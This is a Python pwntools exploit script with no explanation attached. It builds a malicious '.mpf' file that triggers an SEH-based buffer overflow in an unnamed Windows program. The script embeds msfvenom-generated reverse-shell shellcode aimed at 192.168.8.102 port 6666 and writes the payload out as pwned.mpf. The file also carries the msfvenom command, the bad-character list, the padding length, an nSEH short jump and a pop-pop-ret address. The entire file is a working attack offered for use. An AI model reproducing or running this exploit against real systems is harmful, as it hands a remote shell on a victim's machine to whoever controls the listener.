from pwn import *

badchars = b'\x00\x0a\x0d\x1a'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d\x1a' exitfunc=thread -f python LHOST=192.168.8.102 LPORT=6666
shellcode =  b""
shellcode += b"\xbd\x3a\x18\x2a\x44\xdb\xcb\xd9\x74\x24\xf4\x58\x29"
shellcode += b"\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\xfa\x1c\xc8"
shellcode += b"\xb1\x06\xf4\x8e\x3a\xf6\x05\xef\xb3\x13\x34\x2f\xa7"
shellcode += b"\x50\x67\x9f\xa3\x34\x84\x54\xe1\xac\x1f\x18\x2e\xc3"
shellcode += b"\xa8\x97\x08\xea\x29\x8b\x69\x6d\xaa\xd6\xbd\x4d\x93"
shellcode += b"\x18\xb0\x8c\xd4\x45\x39\xdc\x8d\x02\xec\xf0\xba\x5f"
shellcode += b"\x2d\x7b\xf0\x4e\x35\x98\x41\x70\x14\x0f\xd9\x2b\xb6"
shellcode += b"\xae\x0e\x40\xff\xa8\x53\x6d\x49\x43\xa7\x19\x48\x85"
shellcode += b"\xf9\xe2\xe7\xe8\x35\x11\xf9\x2d\xf1\xca\x8c\x47\x01"
shellcode += b"\x76\x97\x9c\x7b\xac\x12\x06\xdb\x27\x84\xe2\xdd\xe4"
shellcode += b"\x53\x61\xd1\x41\x17\x2d\xf6\x54\xf4\x46\x02\xdc\xfb"
shellcode += b"\x88\x82\xa6\xdf\x0c\xce\x7d\x41\x15\xaa\xd0\x7e\x45"
shellcode += b"\x15\x8c\xda\x0e\xb8\xd9\x56\x4d\xd5\x2e\x5b\x6d\x25"
shellcode += b"\x39\xec\x1e\x17\xe6\x46\x88\x1b\x6f\x41\x4f\x5b\x5a"
shellcode += b"\x35\xdf\xa2\x65\x46\xf6\x60\x31\x16\x60\x40\x3a\xfd"
shellcode += b"\x70\x6d\xef\x52\x20\xc1\x40\x13\x90\xa1\x30\xfb\xfa"
shellcode += b"\x2d\x6e\x1b\x05\xe4\x07\xb6\xfc\x6f\xe8\xef\xf6\x09"
shellcode += b"\x80\xed\x06\xcc\x5a\x7b\xe0\x9a\x4a\x2d\xbb\x32\xf2"
shellcode += b"\x74\x37\xa2\xfb\xa2\x32\xe4\x70\x41\xc3\xab\x70\x2c"
shellcode += b"\xd7\x5c\x71\x7b\x85\xcb\x8e\x51\xa1\x90\x1d\x3e\x31"
shellcode += b"\xde\x3d\xe9\x66\xb7\xf0\xe0\xe2\x25\xaa\x5a\x10\xb4"
shellcode += b"\x2a\xa4\x90\x63\x8f\x2b\x19\xe1\xab\x0f\x09\x3f\x33"
shellcode += b"\x14\x7d\xef\x62\xc2\x2b\x49\xdd\xa4\x85\x03\xb2\x6e"
shellcode += b"\x41\xd5\xf8\xb0\x17\xda\xd4\x46\xf7\x6b\x81\x1e\x08"
shellcode += b"\x43\x45\x97\x71\xb9\xf5\x58\xa8\x79\x15\xbb\x78\x74"
shellcode += b"\xbe\x62\xe9\x35\xa3\x94\xc4\x7a\xda\x16\xec\x02\x19"
shellcode += b"\x06\x85\x07\x65\x80\x76\x7a\xf6\x65\x78\x29\xf7\xaf"

buf = b'a'*4112
# nSEH short jmp
buf += b'\xeb\x22\x90\x90'
# SEH pop pop ret
buf += p32(0x10018114)
buf += b'\x90'*50
buf += shellcode

with open('pwned.mpf','wb') as f:
    f.write(buf)

